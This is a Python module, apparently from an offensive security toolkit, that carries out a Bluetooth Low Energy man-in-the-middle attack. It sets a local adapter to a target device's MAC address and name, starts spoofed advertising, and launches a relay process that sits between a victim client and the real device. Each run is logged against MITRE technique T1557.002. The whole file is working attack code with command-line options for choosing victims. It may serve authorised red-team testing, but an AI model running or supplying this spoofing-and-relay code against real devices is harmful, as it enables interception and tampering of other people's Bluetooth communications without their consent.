# modules/attacks/ble_man_in_the_middle.py

import argparse
import subprocess
import time
import json
import os
from datetime import datetime
from hashlib import sha256

LOG_PATH = "results/ble_mitm_logs.json"
MITRE_TTP = "T1557.002"  # Adversary-in-the-Middle: Bluetooth

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def configure_interface(iface, mac, name):
    print(f"[+] Configuring BLE interface {iface} with MAC {mac} and name {name}")
    subprocess.run(["sudo", "hciconfig", iface, "down"], check=True)
    subprocess.run(["sudo", "bdaddr", "-i", iface, mac], check=True)
    subprocess.run(["sudo", "hciconfig", iface, "up"], check=True)
    subprocess.run(["sudo", "hciconfig", iface, "name", name], check=True)

def spoof_advertisement(iface, name):
    print(f"[+] Starting spoofed advertising on {iface} as '{name}'")
    subprocess.run(["sudo", "btmgmt", "--index", iface[-1], "advertise", "on"], check=True)

def run_relay(iface_victim, iface_target):
    print("[*] Launching real BLE relay engine")
    relay_cmd = [
        "python3", "tools/ble_proxy_engine.py",
        "--victim-if", iface_victim,
        "--target-if", iface_target
    ]
    return subprocess.Popen(relay_cmd)

def mitm_attack(victim_mac, target_mac, iface_victim, iface_target, spoof_name):
    print("[+] Executing BLE MITM Attack...")

    configure_interface(iface_victim, target_mac, spoof_name)
    time.sleep(1)
    spoof_advertisement(iface_victim, spoof_name)
    time.sleep(2)
    proc = run_relay(iface_victim, iface_target)

    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "victim_mac": victim_mac,
        "target_mac": target_mac,
        "iface_victim": iface_victim,
        "iface_target": iface_target,
        "spoof_name": spoof_name,
        "relay_pid": proc.pid,
        "ttp": MITRE_TTP
    }

    log_event(log_entry)
    print(f"[✓] BLE MITM active. Relay PID: {proc.pid}")
    print("[*] Press Ctrl+C to terminate")

    try:
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        print("[*] Relay terminated.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Real BLE MITM Proxy + Spoof Engine")
    parser.add_argument("--victim-mac", required=True, help="MAC of the BLE client device")
    parser.add_argument("--target-mac", required=True, help="MAC of real target BLE device")
    parser.add_argument("--iface-victim", default="hci0", help="HCI interface for victim spoofing")
    parser.add_argument("--iface-target", default="hci1", help="HCI interface to talk to target")
    parser.add_argument("--spoof-name", default="BLE_Target", help="Advertised spoof name")

    args = parser.parse_args()
    mitm_attack(args.victim_mac, args.target_mac, args.iface_victim, args.iface_target, args.spoof_name)
